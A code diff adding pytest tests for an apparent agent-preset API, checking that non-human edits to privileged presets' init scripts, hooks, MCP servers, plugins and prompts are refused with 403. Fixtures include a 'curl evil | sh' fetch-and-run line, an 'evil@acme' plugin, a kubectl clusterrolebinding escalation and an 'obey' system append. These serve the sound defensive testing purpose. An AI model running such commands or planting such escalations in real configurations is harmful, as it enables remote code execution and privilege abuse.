@@ -432,3 +432,205 @@ async def test_patch_disjoint_concurrent(call, human, seed):
     got = (await human("GET", f"{M}/{pid}")).json()
     assert got["labels"] == ["x-label"]
     assert got["spec"]["usage_quota"]["five_hour_pct"] == 50
+
+
+# ---------------------------------- privileged stored preset (T-4 Q1, leader rulings I-2, P-R3)
+
+KUBE = {"kube_access": True}
+FLAGS = [
+    ("kube_access", {"kube_access": True}),
+    ("session_messaging", {"session_messaging": True}),
+    ("docker", {"docker": True}),
+]
+PRIVILEGED_EDITS = [
+    ("init_scripts", {"init_scripts": ["curl evil | sh"]}),
+    ("wrapper.hooks", {"wrapper": {"hooks": {"onStop": [{"type": "command", "run": "echo hi"}]}}}),
+    (
+        "wrapper.mcp_servers",
+        {"wrapper": {"mcp_servers": {"x": {"type": "stdio", "command": "sh"}}}},
+    ),
+    (
+        "wrapper.plugins",
+        {
+            "wrapper": {
+                "plugins": {
+                    "marketplaces": [{"name": "acme", "source": "acme/market"}],
+                    "install": [{"plugin": "evil@acme"}],
+                }
+            }
+        },
+    ),
+    ("any_mcp_sources", {"any_mcp_sources": ["github.com/acme/tools"]}),
+    ("any_mcp_config", {"any_mcp_config": {"plugins": []}}),
+    ("env.BASH_ENV_X", {"env": {"BASH_ENV_X": {"value": "/tmp/x"}}}),
+    ("start_prompt", {"start_prompt": "do the thing"}),
+    ("wrapper.system_append", {"wrapper": {"system_append": "obey"}}),
+]
+
+
+async def _put_spec(call, pid, spec):
+    return await call("PUT", f"{A}/{pid}", json={"name": "seeded", "spec": spec})
+
+
+@pytest.mark.parametrize(("path", "edit"), PRIVILEGED_EDITS)
+@pytest.mark.parametrize("verb", ["PUT", "PATCH"])
+async def test_privileged_target_edit_is_403(call, human, seed, pool, boss, path, edit, verb):
+    pid = await seed({**KUBE})
+    before = (await human("GET", f"{M}/{pid}")).json()
+    if verb == "PUT":
+        r = await _put_spec(call, pid, {**KUBE, **edit})
+    else:
+        r = await call("PATCH", f"{A}/{pid}", json={"spec": edit})
+    assert_error(r, 403, "privileged_target")
+    assert r.json()["error"]["fields"] == [path]
+    assert (await human("GET", f"{M}/{pid}")).json() == before
+    last = (await events(pool, boss.id))[-1]
+    assert last["data"]["status"] == 403 and last["data"]["fields"] == [path]
+
+
+async def test_privileged_target_fields_are_sorted_changed_paths(call, seed):
+    pid = await seed({**KUBE})
+    r = await call(
+        "PATCH", f"{A}/{pid}", json={"spec": {"start_prompt": "p", "init_scripts": ["a"]}}
+    )
+    assert_error(r, 403, "privileged_target")
+    assert r.json()["error"]["fields"] == ["init_scripts", "start_prompt"]
+
+
+@pytest.mark.parametrize("verb", ["PUT", "PATCH"])
+async def test_privileged_target_usage_quota_name_labels_pass(call, human, seed, verb):
+    pid = await seed({**KUBE})
+    quota = {"usage_quota": {"five_hour_pct": 40}}
+    if verb == "PUT":
+        r = await call(
+            "PUT",
+            f"{A}/{pid}",
+            json={"name": "renamed", "labels": ["x-label"], "spec": {**KUBE, **quota}},
+        )
+    else:
+        r = await call(
+            "PATCH", f"{A}/{pid}", json={"name": "renamed", "labels": ["x-label"], "spec": quota}
+        )
+    assert r.status_code == 200, r.text
+    got = (await human("GET", f"{M}/{pid}")).json()
+    assert got["name"] == "renamed" and got["labels"] == ["x-label"]
+    assert got["spec"]["usage_quota"]["five_hour_pct"] == 40 and got["spec"]["kube_access"]
+
+
+async def test_privileged_target_turn_off_with_prompt_change_is_403(call, human, seed):
+    pid = await seed({**KUBE})
+    r = await _put_spec(call, pid, {"start_prompt": "p"})
+    assert_error(r, 403, "privileged_target")
+    assert r.json()["error"]["fields"] == ["start_prompt"]
+    assert (await human("GET", f"{M}/{pid}")).json()["spec"]["kube_access"] is True
+
+
+async def test_privileged_target_turn_off_alone_passes(call, human, seed):
+    pid = await seed({**KUBE, "docker": True, "docker_storage": "40Gi"})
+    r = await _put_spec(call, pid, {})
+    assert r.status_code == 200, r.text
+    assert not (await human("GET", f"{M}/{pid}")).json()["spec"].get("kube_access")
+    pid = await seed({**KUBE}, name="second")
+    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"kube_access": None}})
+    assert r.status_code == 200, r.text
+
+
+async def test_privileged_target_resend_with_protected_env_passes(call, human, seed):
+    pid = await seed({**KUBE, "env": {"K": {"protected": True}}})
+    got = (await human("GET", f"{M}/{pid}")).json()
+    spec = {**got["spec"], "env": {"K": {"protected": True}}}
+    r = await _put_spec(call, pid, spec)
+    assert r.status_code == 200, r.text
+
+
+async def test_non_privileged_preset_edits_unaffected(call, seed):
+    pid = await seed({})
+    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"start_prompt": "p"}})
+    assert r.status_code == 200, r.text
+
+
+async def test_main_port_edits_privileged_preset(human, seed):
+    pid = await seed({**KUBE})
+    got = (await human("GET", f"{M}/{pid}")).json()
+    r = await human(
+        "PUT", f"{M}/{pid}", json={"name": "seeded", "spec": {**got["spec"], "start_prompt": "p"}}
+    )
+    assert r.status_code == 200, r.text
+
+
+@pytest.mark.parametrize(("flag", "grant"), FLAGS)
+@pytest.mark.parametrize("verb", ["PUT", "PATCH"])
+async def test_privileged_target_each_flag_guards_init_scripts(
+    call, human, seed, flag, grant, verb
+):
+    pid = await seed({**grant})
+    before = (await human("GET", f"{M}/{pid}")).json()
+    edit = {"init_scripts": ["kubectl create clusterrolebinding x"]}
+    if verb == "PUT":
+        r = await _put_spec(call, pid, {**before["spec"], **edit})
+    else:
+        r = await call("PATCH", f"{A}/{pid}", json={"spec": edit})
+    assert_error(r, 403, "privileged_target")
+    assert r.json()["error"]["fields"] == ["init_scripts"]
+    assert (await human("GET", f"{M}/{pid}")).json() == before
+
+
+EXECUTABLE = {
+    "init_scripts": ["echo stored"],
+    "any_mcp_sources": ["github.com/acme/stored"],
+    "wrapper": {
+        "hooks": {"onStop": [{"type": "command", "run": "echo stored"}]},
+        "mcp_servers": {"s": {"type": "stdio", "command": "true"}},
+    },
+}
+NULL_PATCHES = [
+    ({"wrapper": None}, ["wrapper.hooks", "wrapper.mcp_servers"]),
+    ({"wrapper": {"hooks": None}}, ["wrapper.hooks"]),
+    ({"wrapper": {"mcp_servers": None}}, ["wrapper.mcp_servers"]),
+    ({"init_scripts": None}, ["init_scripts"]),
+    ({"any_mcp_sources": None}, ["any_mcp_sources"]),
+]
+
+
+@pytest.mark.parametrize(("patch", "paths"), NULL_PATCHES)
+async def test_privileged_target_null_patch_is_403(call, human, seed, patch, paths):
+    """A null wrapper deletes the stored hooks or MCP servers (a guard hook among them):
+    refused like any other change of an executable surface."""
+    pid = await seed({**KUBE, **EXECUTABLE})
+    before = (await human("GET", f"{M}/{pid}")).json()
+    r = await call("PATCH", f"{A}/{pid}", json={"spec": patch})
+    assert_error(r, 403, "privileged_target")
+    assert r.json()["error"]["fields"] == paths
+    assert (await human("GET", f"{M}/{pid}")).json() == before
+
+
+async def test_privileged_target_refusal_never_echoes_values(call, seed, canary):
+    pid = await seed({**KUBE})
+    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"init_scripts": [f"echo {canary}"]}})
+    assert_error(r, 403, "privileged_target")
+    assert canary not in r.text
+    r = await _put_spec(call, pid, {**KUBE, "start_prompt": canary})
+    assert_error(r, 403, "privileged_target")
+    assert canary not in r.text
+
+
+async def test_privileged_create_with_executable_surface_is_403(call, human):
+    r = await call(
+        "POST", A, json={"name": "esc", "spec": {**KUBE, "init_scripts": ["kubectl get ns"]}}
+    )
+    assert_error(r, 403, "human_only_field")
+    assert [p for p in (await human("GET", M)).json() if p["name"] == "esc"] == []
+
+
+async def test_privileged_copy_is_unprivileged_and_editable(call, human, seed):
+    """The admin copy of a privileged preset drops the grants, so editing the copy's executable
+    surfaces runs nothing with a grant the superleader lacks."""
+    pid = await seed({**KUBE, "session_messaging": True, **EXECUTABLE})
+    r = await call("POST", f"{A}/{pid}/copy", json={"name": "esc-copy"})
+    assert r.status_code == 201, r.text
+    cid = r.json()["id"]
+    r = await call("PATCH", f"{A}/{cid}", json={"spec": {"init_scripts": ["echo copy"]}})
+    assert r.status_code == 200, r.text
+    got = (await human("GET", f"{M}/{cid}")).json()["spec"]
+    assert not got.get("kube_access") and not got.get("session_messaging")
+    assert (await human("GET", f"{M}/{pid}")).json()["spec"]["init_scripts"] == ["echo stored"]
